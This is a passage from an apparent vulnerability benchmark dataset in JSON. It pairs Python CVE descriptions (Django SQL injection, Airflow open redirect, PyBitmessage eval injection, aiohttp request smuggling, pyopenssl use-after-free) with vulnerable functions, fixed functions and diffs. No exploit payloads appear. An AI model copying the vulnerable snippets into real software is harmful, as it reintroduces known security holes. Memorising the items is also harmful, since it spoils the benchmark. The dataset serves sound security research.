rarfile\\u6765\\u89e3\\u538brar\\u6587\\u4ef6\\u3002\\u5efa\\u8bae\\uff1a\\u4f7f\\u7528zip\\u538b\\u7f29\\u683c\\u5f0f\\u3002\"\n \n     # \\u7b2c\\u4e09\\u65b9\\u5e93\\uff0c\\u9700\\u8981\\u9884\\u5148pip install py7zr\n     elif file_extension == \".7z\":\n@@ -61,7 +58,7 @@\n                 logger.info(\"Successfully extracted 7z archive to {}\".format(dest_dir))\n         except:\n             logger.info(\"7z format requires additional dependencies to install\")\n-            return \"\\n\\n\\u89e3\\u538b\\u5931\\u8d25! \\u9700\\u8981\\u5b89\\u88c5pip install py7zr\\u6765\\u89e3\\u538b7z\\u6587\\u4ef6\"\n+            return \"<br/><br/>\\u89e3\\u538b\\u5931\\u8d25! \\u9700\\u8981\\u5b89\\u88c5pip install py7zr\\u6765\\u89e3\\u538b7z\\u6587\\u4ef6\"\n     else:\n         return \"\"\n     return \"\"\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-7471",
    "cve_description": "Django 1.11 before 1.11.28, 2.2 before 2.2.10, and 3.0 before 3.0.3 allows SQL Injection if untrusted data is used as a StringAgg delimiter (e.g., in Django applications that offer downloads of data as a series of rows with a user-specified column delimiter). By passing a suitably crafted delimiter to a contrib.postgres.aggregates.StringAgg instance, it was possible to break escaping and inject malicious SQL.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/eb31d845323618d688ad429479c6dda973056136",
      "https://github.com/django/django/commit/001b0634cd309e372edb6d7d95d083d02b8e37bd",
      "https://github.com/django/django/commit/505826b469b16ab36693360da9e11fd13213421b",
      "https://github.com/django/django/commit/c67a368c16e4680b324b4f385398d638db4d8147"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_206_1",
        "commit": "6b178a3",
        "file_path": "django/contrib/postgres/aggregates/general.py",
        "start_line": 52,
        "end_line": 63,
        "snippet": "class StringAgg(OrderableAggMixin, Aggregate):\n    function = 'STRING_AGG'\n    template = \"%(function)s(%(distinct)s%(expressions)s, '%(delimiter)s'%(ordering)s)\"\n    allow_distinct = True\n\n    def __init__(self, expression, delimiter, **extra):\n        super().__init__(expression, delimiter=delimiter, **extra)\n\n    def convert_value(self, value, expression, connection):\n        if not value:\n            return ''\n        return value"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_206_1",
        "commit": "eb31d84",
        "file_path": "django/contrib/postgres/aggregates/general.py",
        "start_line": 53,
        "end_line": 65,
        "snippet": "class StringAgg(OrderableAggMixin, Aggregate):\n    function = 'STRING_AGG'\n    template = '%(function)s(%(distinct)s%(expressions)s %(ordering)s)'\n    allow_distinct = True\n\n    def __init__(self, expression, delimiter, **extra):\n        delimiter_expr = Value(str(delimiter))\n        super().__init__(expression, delimiter_expr, **extra)\n\n    def convert_value(self, value, expression, connection):\n        if not value:\n            return ''\n        return value"
      }
    ],
    "vul_patch": "--- a/django/contrib/postgres/aggregates/general.py\n+++ b/django/contrib/postgres/aggregates/general.py\n@@ -1,10 +1,11 @@\n class StringAgg(OrderableAggMixin, Aggregate):\n     function = 'STRING_AGG'\n-    template = \"%(function)s(%(distinct)s%(expressions)s, '%(delimiter)s'%(ordering)s)\"\n+    template = '%(function)s(%(distinct)s%(expressions)s %(ordering)s)'\n     allow_distinct = True\n \n     def __init__(self, expression, delimiter, **extra):\n-        super().__init__(expression, delimiter=delimiter, **extra)\n+        delimiter_expr = Value(str(delimiter))\n+        super().__init__(expression, delimiter_expr, **extra)\n \n     def convert_value(self, value, expression, connection):\n         if not value:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-43985",
    "cve_description": "In Apache Airflow versions prior to 2.4.2, there was an open redirect in the webserver's `/confirm` endpoint.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/apache/airflow",
    "patch_url": [
      "https://github.com/apache/airflow/commit/9fb4814d29d934cef3b02fb3b2547f9fb76aaa97"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_go_177_1",
        "commit": "2987801",
        "file_path": "airflow/www/views.py",
        "start_line": 156,
        "end_line": 178,
        "snippet": "def get_safe_url(url):\n    \"\"\"Given a user-supplied URL, ensure it points to our web server\"\"\"\n    valid_schemes = ['http', 'https', '']\n    valid_netlocs = [request.host, '']\n\n    if not url:\n        return url_for('Airflow.index')\n\n    parsed = urlparse(url)\n\n    # If the url contains semicolon, redirect it to homepage to avoid\n    # potential XSS. (Similar to https://github.com/python/cpython/pull/24297/files (bpo-42967))\n    if ';' in unquote(url):\n        return url_for('Airflow.index')\n\n    query = parse_qsl(parsed.query, keep_blank_values=True)\n\n    url = parsed._replace(query=urlencode(query)).geturl()\n\n    if parsed.scheme in valid_schemes and parsed.netloc in valid_netlocs:\n        return url\n\n    return url_for('Airflow.index')"
      }
    ],
    "fix_func": [
      {
        "id": "fix_go_177_1",
        "commit": "9fb4814",
        "file_path": "airflow/www/views.py",
        "start_line": 156,
        "end_line": 172,
        "snippet": "def get_safe_url(url):\n    \"\"\"Given a user-supplied URL, ensure it points to our web server\"\"\"\n    if not url:\n        return url_for('Airflow.index')\n\n    # If the url contains semicolon, redirect it to homepage to avoid\n    # potential XSS. (Similar to https://github.com/python/cpython/pull/24297/files (bpo-42967))\n    if ';' in unquote(url):\n        return url_for('Airflow.index')\n\n    host_url = urlsplit(request.host_url)\n    redirect_url = urlsplit(urljoin(request.host_url, url))\n    if not (redirect_url.scheme in (\"http\", \"https\") and host_url.netloc == redirect_url.netloc):\n        return url_for('Airflow.index')\n\n    # This will ensure we only redirect to the right scheme/netloc\n    return redirect_url.geturl()"
      }
    ],
    "vul_patch": "--- a/airflow/www/views.py\n+++ b/airflow/www/views.py\n@@ -1,23 +1,17 @@\n def get_safe_url(url):\n     \"\"\"Given a user-supplied URL, ensure it points to our web server\"\"\"\n-    valid_schemes = ['http', 'https', '']\n-    valid_netlocs = [request.host, '']\n-\n     if not url:\n         return url_for('Airflow.index')\n-\n-    parsed = urlparse(url)\n \n     # If the url contains semicolon, redirect it to homepage to avoid\n     # potential XSS. (Similar to https://github.com/python/cpython/pull/24297/files (bpo-42967))\n     if ';' in unquote(url):\n         return url_for('Airflow.index')\n \n-    query = parse_qsl(parsed.query, keep_blank_values=True)\n+    host_url = urlsplit(request.host_url)\n+    redirect_url = urlsplit(urljoin(request.host_url, url))\n+    if not (redirect_url.scheme in (\"http\", \"https\") and host_url.netloc == redirect_url.netloc):\n+        return url_for('Airflow.index')\n \n-    url = parsed._replace(query=urlencode(query)).geturl()\n-\n-    if parsed.scheme in valid_schemes and parsed.netloc in valid_netlocs:\n-        return url\n-\n-    return url_for('Airflow.index')\n+    # This will ensure we only redirect to the right scheme/netloc\n+    return redirect_url.geturl()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-1000070",
    "cve_description": "Bitmessage PyBitmessage version v0.6.2 (and introduced in or after commit 8ce72d8d2d25973b7064b1cf76a6b0b3d62f0ba0) contains a Eval injection vulnerability in main program, file src/messagetypes/__init__.py function constructObject that can result in Code Execution. This attack appears to be exploitable via remote attacker using a malformed message which must be processed by the victim - e.g. arrive from any sender on bitmessage network. This vulnerability appears to have been fixed in v0.6.3.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      }
    },
    "repo": "https://github.com/Bitmessage/PyBitmessage",
    "patch_url": [
      "https://github.com/Bitmessage/PyBitmessage/commit/3a8016d31f517775d226aa8b902480f4a3a148a9"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_342_1",
        "commit": "96ea36cfd245f7dc10209b01278b5fa2970f360c",
        "file_path": "src/messagetypes/__init__.py",
        "start_line": 13,
        "end_line": 29,
        "snippet": "def constructObject(data):\n    try:\n        classBase = eval(data[\"\"] + \".\" + data[\"\"].title())\n    except NameError:\n        logger.error(\"Don't know how to handle message type: \\\"%s\\\"\", data[\"\"])\n        return None\n    try:\n        returnObj = classBase()\n        returnObj.decode(data)\n    except KeyError as e:\n        logger.error(\"Missing mandatory key %s\", e)\n        return None\n    except:\n        logger.error(\"classBase fail\", exc_info=True)\n        return None\n    else:\n        return returnObj"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_342_1",
        "commit": "3a8016d31f517775d226aa8b902480f4a3a148a9",
        "file_path": "src/messagetypes/__init__.py",
        "start_line": 13,
        "end_line": 30,
        "snippet": "def constructObject(data):\n    try:\n        m = import_module(\"messagetypes.\" + data[\"\"])\n        classBase = getattr(m, data[\"\"].title())\n    except (NameError, ImportError):\n        logger.error(\"Don't know how to handle message type: \\\"%s\\\"\", data[\"\"], exc_info=True)\n        return None\n    try:\n        returnObj = classBase()\n        returnObj.decode(data)\n    except KeyError as e:\n        logger.error(\"Missing mandatory key %s\", e)\n        return None\n    except:\n        logger.error(\"classBase fail\", exc_info=True)\n        return None\n    else:\n        return returnObj"
      }
    ],
    "vul_patch": "--- a/src/messagetypes/__init__.py\n+++ b/src/messagetypes/__init__.py\n@@ -1,8 +1,9 @@\n def constructObject(data):\n     try:\n-        classBase = eval(data[\"\"] + \".\" + data[\"\"].title())\n-    except NameError:\n-        logger.error(\"Don't know how to handle message type: \\\"%s\\\"\", data[\"\"])\n+        m = import_module(\"messagetypes.\" + data[\"\"])\n+        classBase = getattr(m, data[\"\"].title())\n+    except (NameError, ImportError):\n+        logger.error(\"Don't know how to handle message type: \\\"%s\\\"\", data[\"\"], exc_info=True)\n         return None\n     try:\n         returnObj = classBase()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-47641",
    "cve_description": "aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. Affected versions of aiohttp have a security vulnerability regarding the inconsistent interpretation of the http protocol. HTTP/1.1 is a persistent protocol, if both Content-Length(CL) and Transfer-Encoding(TE) header values are present it can lead to incorrect interpretation of two entities that parse the HTTP and we can poison other sockets with this incorrect interpretation. A possible Proof-of-Concept (POC) would be a configuration with a reverse proxy(frontend) that accepts both CL and TE headers and aiohttp as backend. As aiohttp parses anything with chunked, we can pass a chunked123 as TE, the frontend entity will ignore this header and will parse Content-Length. The impact of this vulnerability is that it is possible to bypass any proxy rule, poisoning sockets to other users like passing Authentication Headers, also if it is present an Open Redirect an attacker could combine it to redirect random users to another website and log the request. This vulnerability has been addressed in release 3.8.0 of aiohttp. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-444": {
        "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')",
        "description": "The product acts as an intermediary HTTP agent\n         (such as a proxy or firewall) in the data flow between two\n         entities such as a client and server, but it does not\n         interpret malformed HTTP requests or responses in ways that\n         are consistent with how the messages will be processed by\n         those entities that are at the ultimate destination."
      }
    },
    "repo": "https://github.com/aio-libs/aiohttp",
    "patch_url": [
      "https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_103_1",
        "commit": "a8f01d7",
        "file_path": "aiohttp/http_parser.py",
        "start_line": "456",
        "end_line": "495",
        "snippet": "    def parse_headers(\n        self, lines: List[bytes]\n    ) -> Tuple[\n        \"CIMultiDictProxy[str]\", RawHeaders, Optional[bool], Optional[str], bool, bool\n    ]:\n        \"\"\"Parses RFC 5322 headers from a stream.\n\n        Line continuations are supported. Returns list of header name\n        and value pairs. Header name is in upper case.\n        \"\"\"\n        headers, raw_headers = self._headers_parser.parse_headers(lines)\n        close_conn = None\n        encoding = None\n        upgrade = False\n        chunked = False\n\n        # keep-alive\n        conn = headers.get(hdrs.CONNECTION)\n        if conn:\n            v = conn.lower()\n            if v == \"close\":\n                close_conn = True\n            elif v == \"keep-alive\":\n                close_conn = False\n            elif v == \"upgrade\":\n                upgrade = True\n\n        # encoding\n        enc = headers.get(hdrs.CONTENT_ENCODING)\n        if enc:\n            enc = enc.lower()\n            if enc in (\"gzip\", \"deflate\", \"br\"):\n                encoding = enc\n\n        # chunking\n        te = headers.get(hdrs.TRANSFER_ENCODING)\n        if te and \"chunked\" in te.lower():\n            chunked = True\n\n        return (headers, raw_headers, close_conn, encoding, upgrade, chunked)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_103_1",
        "commit": "f016f06",
        "file_path": "aiohttp/http_parser.py",
        "start_line": "457",
        "end_line": "503",
        "snippet": "    def parse_headers(\n        self, lines: List[bytes]\n    ) -> Tuple[\n        \"CIMultiDictProxy[str]\", RawHeaders, Optional[bool], Optional[str], bool, bool\n    ]:\n        \"\"\"Parses RFC 5322 headers from a stream.\n\n        Line continuations are supported. Returns list of header name\n        and value pairs. Header name is in upper case.\n        \"\"\"\n        headers, raw_headers = self._headers_parser.parse_headers(lines)\n        close_conn = None\n        encoding = None\n        upgrade = False\n        chunked = False\n\n        # keep-alive\n        conn = headers.get(hdrs.CONNECTION)\n        if conn:\n            v = conn.lower()\n            if v == \"close\":\n                close_conn = True\n            elif v == \"keep-alive\":\n                close_conn = False\n            elif v == \"upgrade\":\n                upgrade = True\n\n        # encoding\n        enc = headers.get(hdrs.CONTENT_ENCODING)\n        if enc:\n            enc = enc.lower()\n            if enc in (\"gzip\", \"deflate\", \"br\"):\n                encoding = enc\n\n        # chunking\n        te = headers.get(hdrs.TRANSFER_ENCODING)\n        if te is not None:\n            te_lower = te.lower()\n            if \"chunked\" in te_lower:\n                chunked = True\n\n            if hdrs.CONTENT_LENGTH in headers:\n                raise BadHttpMessage(\n                    \"Content-Length can't be present with Transfer-Encoding\",\n                )\n\n        return (headers, raw_headers, close_conn, encoding, upgrade, chunked)"
      }
    ],
    "vul_patch": "--- a/aiohttp/http_parser.py\n+++ b/aiohttp/http_parser.py\n@@ -34,7 +34,14 @@\n \n         # chunking\n         te = headers.get(hdrs.TRANSFER_ENCODING)\n-        if te and \"chunked\" in te.lower():\n-            chunked = True\n+        if te is not None:\n+            te_lower = te.lower()\n+            if \"chunked\" in te_lower:\n+                chunked = True\n+\n+            if hdrs.CONTENT_LENGTH in headers:\n+                raise BadHttpMessage(\n+                    \"Content-Length can't be present with Transfer-Encoding\",\n+                )\n \n         return (headers, raw_headers, close_conn, encoding, upgrade, chunked)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-1000807",
    "cve_description": "Python Cryptographic Authority pyopenssl version prior to version 17.5.0 contains a CWE-416: Use After Free vulnerability in X509 object handling that can result in Use after free can lead to possible denial of service or remote code execution.. This attack appear to be exploitable via Depends on the calling application and if it retains a reference to the memory.. This vulnerability appears to have been fixed in 17.5.0.",
    "cwe_info": {
      "CWE-416": {
        "name": "Use After Free",
        "description": "The product reuses or references memory after it has been freed. At some point afterward, the memory may be allocated again and saved in another pointer, while the original pointer references a location somewhere within the new allocation. Any operations using the original pointer are no longer valid because the memory \"belongs\" to the code that operates on the new pointer."
      }
    },
    "repo": "https://github.com/pyca/pyopenssl",
    "patch_url": [
      "https://github.com/pyca/pyopenssl/commit/e73818600065821d588af475b024f4eb518c3509"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_426_1",
        "commit": "f724786",
        "file_path": "src/OpenSSL/SSL.py",
        "start_line": 311,
        "end_line": 336,
        "snippet": "        def wrapper(ok, store_ctx):\n            cert = X509.__new__(X509)\n            cert._x509 = _lib.X509_STORE_CTX_get_current_cert(store_ctx)\n            error_number = _lib.X509_STORE_CTX_get_error(store_ctx)\n            error_depth = _lib.X509_STORE_CTX_get_error_depth(store_ctx)\n\n            index = _lib.SSL_get_ex_data_X509_STORE_CTX_idx()\n            ssl = _lib.X509_STORE_CTX_get_ex_data(store_ctx, index)\n            connection = Connection._reverse_mapping[ssl]\n\n            try:\n                result = callback(\n                    connection, cert, error_number, error_depth, ok\n                )\n            except Exception as e:\n                self._problems.append(e)\n                return 0\n            else:\n                if result:\n                    _lib.X509_STORE_CTX_set_error(store_ctx, _lib.X509_V_OK)\n                    return 1\n                else:\n                    return 0\n\n        self.callback = _ffi.callback(\n            \"int (*)(int, X509_STORE_CTX *)\", wrapper)"
      },
      {
        "id": "vul_py_426_2",
        "commit": "f724786",
        "file_path": "src/OpenSSL/crypto.py",
        "start_line": 3006,
        "end_line": 3087,
        "snippet": "def load_pkcs12(buffer, passphrase=None):\n    \"\"\"\n    Load a PKCS12 object from a buffer\n\n    :param buffer: The buffer the certificate is stored in\n    :param passphrase: (Optional) The password to decrypt the PKCS12 lump\n    :returns: The PKCS12 object\n    \"\"\"\n    passphrase = _text_to_bytes_and_warn(\"passphrase\", passphrase)\n\n    if isinstance(buffer, _text_type):\n        buffer = buffer.encode(\"ascii\")\n\n    bio = _new_mem_buf(buffer)\n\n    # Use null passphrase if passphrase is None or empty string. With PKCS#12\n    # password based encryption no password and a zero length password are two\n    # different things, but OpenSSL implementation will try both to figure out\n    # which one works.\n    if not passphrase:\n        passphrase = _ffi.NULL\n\n    p12 = _lib.d2i_PKCS12_bio(bio, _ffi.NULL)\n    if p12 == _ffi.NULL:\n        _raise_current_error()\n    p12 = _ffi.gc(p12, _lib.PKCS12_free)\n\n    pkey = _ffi.new(\"EVP_PKEY**\")\n    cert = _ffi.new(\"X509**\")\n    cacerts = _ffi.new(\"Cryptography_STACK_OF_X509**\")\n\n    parse_result = _lib.PKCS12_parse(p12, passphrase, pkey, cert, cacerts)\n    if not parse_result:\n        _raise_current_error()\n\n    cacerts = _ffi.gc(cacerts[0], _lib.sk_X509_free)\n\n    # openssl 1.0.0 sometimes leaves an X509_check_private_key error in the\n    # queue for no particular reason.  This error isn't interesting to anyone\n    # outside this function.  It's not even interesting to us.  Get rid of it.\n    try:\n        _raise_current_error()\n    except Error:\n        pass\n\n    if pkey[0] == _ffi.NULL:\n        pykey = None\n    else:\n        pykey = PKey.__new__(PKey)\n        pykey._pkey = _ffi.gc(pkey[0], _lib.EVP_PKEY_free)\n\n    if cert[0] == _ffi.NULL:\n        pycert = None\n        friendlyname = None\n    else:\n        pycert = X509.__new__(X509)\n        pycert._x509 = _ffi.gc(cert[0], _lib.X509_free)\n\n        friendlyname_length = _ffi.new(\"int*\")\n        friendlyname_buffer = _lib.X509_alias_get0(\n            cert[0], friendlyname_length\n        )\n        friendlyname = _ffi.buffer(\n            friendlyname_buffer, friendlyname_length[0]\n        )[:]\n        if friendlyname_buffer == _ffi.NULL:\n            friendlyname = None\n\n    pycacerts = []\n    for i in range(_lib.sk_X509_num(cacerts)):\n        pycacert = X509.__new__(X509)\n        pycacert._x509 = _lib.sk_X509_value(cacerts, i)\n        pycacerts.append(pycacert)\n    if not pycacerts:\n        pycacerts = None\n\n    pkcs12 = PKCS12.__new__(PKCS12)\n    pkcs12._pkey = pykey\n    pkcs12._cert = pycert\n    pkcs12._cacerts = pycacerts\n    pkcs12._friendlyname = friendlyname\n    return pkcs12"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_426_1",
        "commit": "e73818600065821d588af475b024f4eb518c3509",
        "file_path": "src/OpenSSL/SSL.py",
        "start_line": 311,
        "end_line": 337,
        "snippet": "        def wrapper(ok, store_ctx):\n            x509 = _lib.X509_STORE_CTX_get_current_cert(store_ctx)\n            _lib.X509_up_ref(x509)\n            cert = X509._from_raw_x509_ptr(x509)\n            error_number = _lib.X509_STORE_CTX_get_error(store_ctx)\n            error_depth = _lib.X509_STORE_CTX_get_error_depth(store_ctx)\n\n            index = _lib.SSL_get_ex_data_X509_STORE_CTX_idx()\n            ssl = _lib.X509_STORE_CTX_get_ex_data(store_ctx, index)\n            connection = Connection._reverse_mapping[ssl]\n\n            try:\n                result = callback(\n                    connection, cert, error_number, error_depth, ok\n                )\n            except Exception as e:\n                self._problems.append(e)\n                return 0\n            else:\n                if result:\n                    _lib.X509_STORE_CTX_set_error(store_ctx, _lib.X509_V_OK)\n                    return 1\n                else:\n                    return 0\n\n        self.callback = _ffi.callback(\n            \"int (*)(int, X509_STORE_CTX *)\", wrapper)"
      },
      {
        "id": "fix_py_426_2",
        "commit": "e73818600065821d588af475b024f4eb518c3509",
        "file_path": "src/OpenSSL/crypto.py",
        "start_line": 3006,
        "end_line": 3086,
        "snippet": "def load_pkcs12(buffer, passphrase=None):\n    \"\"\"\n    Load a PKCS12 object from a buffer\n\n    :param buffer: The buffer the certificate is stored in\n    :param passphrase: (Optional) The password to decrypt the PKCS12 lump\n    :returns: The PKCS12 object\n    \"\"\"\n    passphrase = _text_to_bytes_and_warn(\"passphrase\", passphrase)\n\n    if isinstance(buffer, _text_type):\n        buffer = buffer.encode(\"ascii\")\n\n    bio = _new_mem_buf(buffer)\n\n    # Use null passphrase if passphrase is None or empty string. With PKCS#12\n    # password based encryption no password and a zero length password are two\n    # different things, but OpenSSL implementation will try both to figure out\n    # which one works.\n    if not passphrase:\n        passphrase = _ffi.NULL\n\n    p12 = _lib.d2i_PKCS12_bio(bio, _ffi.NULL)\n    if p12 == _ffi.NULL:\n        _raise_current_error()\n    p12 = _ffi.gc(p12, _lib.PKCS12_free)\n\n    pkey = _ffi.new(\"EVP_PKEY**\")\n    cert = _ffi.new(\"X509**\")\n    cacerts = _ffi.new(\"Cryptography_STACK_OF_X509**\")\n\n    parse_result = _lib.PKCS12_parse(p12, passphrase, pkey, cert, cacerts)\n    if not parse_result:\n        _raise_current_error()\n\n    cacerts = _ffi.gc(cacerts[0], _lib.sk_X509_free)\n\n    # openssl 1.0.0 sometimes leaves an X509_check_private_key error in the\n    # queue for no particular reason.  This error isn't interesting to anyone\n    # outside this function.  It's not even interesting to us.  Get rid of it.\n    try:\n        _raise_current_error()\n    except Error:\n        pass\n\n    if pkey[0] == _ffi.NULL:\n        pykey = None\n    else:\n        pykey = PKey.__new__(PKey)\n        pykey._pkey = _ffi.gc(pkey[0], _lib.EVP_PKEY_free)\n\n    if cert[0] == _ffi.NULL:\n        pycert = None\n        friendlyname = None\n    else:\n        pycert = X509._from_raw_x509_ptr(cert[0])\n\n        friendlyname_length = _ffi.new(\"int*\")\n        friendlyname_buffer = _lib.X509_alias_get0(\n            cert[0], friendlyname_length\n        )\n        friendlyname = _ffi.buffer(\n            friendlyname_buffer, friendlyname_length[0]\n        )[:]\n        if friendlyname_buffer == _ffi.NULL:\n            friendlyname = None\n\n    pycacerts = []\n    for i in range(_lib.sk_X509_num(cacerts)):\n        x509 = _lib.sk_X509_value(cacerts, i)\n        pycacert = X509._from_raw_x509_ptr(x509)\n        pycacerts.append(pycacert)\n    if not pycacerts:\n        pycacerts = None\n\n    pkcs12 = PKCS12.__new__(PKCS12)\n    pkcs12._pkey = pykey\n    pkcs12._cert = pycert\n    pkcs12._cacerts = pycacerts\n    pkcs12._friendlyname = friendlyname\n    return pkcs12"
      }
    ],
    "vul_patch": "--- a/src/OpenSSL/SSL.py\n+++ b/src/OpenSSL/SSL.py\n@@ -1,6 +1,7 @@\n         def wrapper(ok, store_ctx):\n-            cert = X509.__new__(X509)\n-            cert._x509 = _lib.X509_STORE_CTX_get_current_cert(store_ctx)\n+            x509 = _lib.X509_STORE_CTX_get_current_cert(store_ctx)\n+            _lib.X509_up_ref(x509)\n+            cert = X509._from_raw_x509_ptr(x509)\n             error_number = _lib.X509_STORE_CTX_get_error(store_ctx)\n             error_depth = _lib.X509_STORE_CTX_get_error_depth(store_ctx)\n \n\n--- a/src/OpenSSL/crypto.py\n+++ b/src/OpenSSL/crypto.py\n@@ -53,8 +53,7 @@\n         pycert = None\n         friendlyname = None\n     else:\n-        pycert = X509.__new__(X509)\n-        pycert._x509 = _ffi.gc(cert[0], _lib.X509_free)\n+        pycert = X509._from_raw_x509_ptr(cert[0])\n \n         friendlyname_length = _ffi.new(\"int*\")\n         friendlyname_buffer = _lib.X509_alias_get0(\n@@ -68,8 +67,8 @@\n \n     pycacerts = []\n     for i in range(_lib.sk_X509_num(cacerts)):\n-        pycacert = X509.__new__(X509)\n-        pycacert._x509 = _lib.sk_X509_value(cacerts, i)\n+        x509 = _lib.sk_X509_value(cacerts, i)\n+        pycacert = X509._from_raw_x509_ptr(x509)\n         pycacerts.append(pycacert)\n     if not pycacerts:\n         pycacerts = None\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-26130",
    "cve_description": "cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. Starting in version 38.0.0 and prior to version 42.0.4, if `pkcs12.serialize_key_and_certificates` is called with both a certificate whose public key did not match the provided private key and an `encryption_algorithm` with `hmac_hash` set (via `PrivateFormat.PKCS12.encryption_builder().hmac_hash(...)`, then a NULL pointer dereference would occur, crashing the Python process. This has been resolved in version 42.0.4, the first version in which a `ValueError` is properly raised.",
    "cwe_info": {
      "CWE-476": {
        "name": "NULL Pointer Dereference",
        "description": "The product dereferences a pointer that it expects to be valid but is NULL."
      }
    },
    "repo": "https://github.com/pyca/cryptography",
    "patch_url": [
      "https://github.com/pyca/cryptography/commit/97d231672763cdb5959a3b191e692a362f1b9e55"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_427_1",
        "commit": "4398f19",
        "file_path": "src/cryptography/hazmat/backends/openssl/backend.py",
        "start_line": 491,
        "end_line": 647,
        "snippet": "    def serialize_key_and_certificates_to_pkcs12(\n        self,\n        name: bytes | None,\n        key: PKCS12PrivateKeyTypes | None,\n        cert: x509.Certificate | None,\n        cas: list[_PKCS12CATypes] | None,\n        encryption_algorithm: serialization.KeySerializationEncryption,\n    ) -> bytes:\n        password = None\n        if name is not None:\n            utils._check_bytes(\"name\", name)\n\n        if isinstance(encryption_algorithm, serialization.NoEncryption):\n            nid_cert = -1\n            nid_key = -1\n            pkcs12_iter = 0\n            mac_iter = 0\n            mac_alg = self._ffi.NULL\n        elif isinstance(\n            encryption_algorithm, serialization.BestAvailableEncryption\n        ):\n            # PKCS12 encryption is hopeless trash and can never be fixed.\n            # OpenSSL 3 supports PBESv2, but Libre and Boring do not, so\n            # we use PBESv1 with 3DES on the older paths.\n            if rust_openssl.CRYPTOGRAPHY_OPENSSL_300_OR_GREATER:\n                nid_cert = self._lib.NID_aes_256_cbc\n                nid_key = self._lib.NID_aes_256_cbc\n            else:\n                nid_cert = self._lib.NID_pbe_WithSHA1And3_Key_TripleDES_CBC\n                nid_key = self._lib.NID_pbe_WithSHA1And3_Key_TripleDES_CBC\n            # At least we can set this higher than OpenSSL's default\n            pkcs12_iter = 20000\n            # mac_iter chosen for compatibility reasons, see:\n            # https://www.openssl.org/docs/man1.1.1/man3/PKCS12_create.html\n            # Did we mention how lousy PKCS12 encryption is?\n            mac_iter = 1\n            # MAC algorithm can only be set on OpenSSL 3.0.0+\n            mac_alg = self._ffi.NULL\n            password = encryption_algorithm.password\n        elif (\n            isinstance(\n                encryption_algorithm, serialization._KeySerializationEncryption\n            )\n            and encryption_algorithm._format\n            is serialization.PrivateFormat.PKCS12\n        ):\n            # Default to OpenSSL's defaults. Behavior will vary based on the\n            # version of OpenSSL cryptography is compiled against.\n            nid_cert = 0\n            nid_key = 0\n            # Use the default iters we use in best available\n            pkcs12_iter = 20000\n            # See the Best Available comment for why this is 1\n            mac_iter = 1\n            password = encryption_algorithm.password\n            keycertalg = encryption_algorithm._key_cert_algorithm\n            if keycertalg is PBES.PBESv1SHA1And3KeyTripleDESCBC:\n                nid_cert = self._lib.NID_pbe_WithSHA1And3_Key_TripleDES_CBC\n                nid_key = self._lib.NID_pbe_WithSHA1And3_Key_TripleDES_CBC\n            elif keycertalg is PBES.PBESv2SHA256AndAES256CBC:\n                if not rust_openssl.CRYPTOGRAPHY_OPENSSL_300_OR_GREATER:\n                    raise UnsupportedAlgorithm(\n                        \"PBESv2 is not supported by this version of OpenSSL\"\n                    )\n                nid_cert = self._lib.NID_aes_256_cbc\n                nid_key = self._lib.NID_aes_256_cbc\n            else:\n                assert keycertalg is None\n                # We use OpenSSL's defaults\n\n            if encryption_algorithm._hmac_hash is not None:\n                if not self._lib.Cryptography_HAS_PKCS12_SET_MAC:\n                    raise UnsupportedAlgorithm(\n                        \"Setting MAC algorithm is not supported by this \"\n                        \"version of OpenSSL.\"\n                    )\n                mac_alg = self._evp_md_non_null_from_algorithm(\n                    encryption_algorithm._hmac_hash\n                )\n                self.openssl_assert(mac_alg != self._ffi.NULL)\n            else:\n                mac_alg = self._ffi.NULL\n\n            if encryption_algorithm._kdf_rounds is not None:\n                pkcs12_iter = encryption_algorithm._kdf_rounds\n\n        else:\n            raise ValueError(\"Unsupported key encryption type\")\n\n        if cas is None or len(cas) == 0:\n            sk_x509 = self._ffi.NULL\n        else:\n            sk_x509 = self._lib.sk_X509_new_null()\n            sk_x509 = self._ffi.gc(sk_x509, self._lib.sk_X509_free)\n\n            # This list is to keep the x509 values alive until end of function\n            ossl_cas = []\n            for ca in cas:\n                if isinstance(ca, PKCS12Certificate):\n                    ca_alias = ca.friendly_name\n                    ossl_ca = 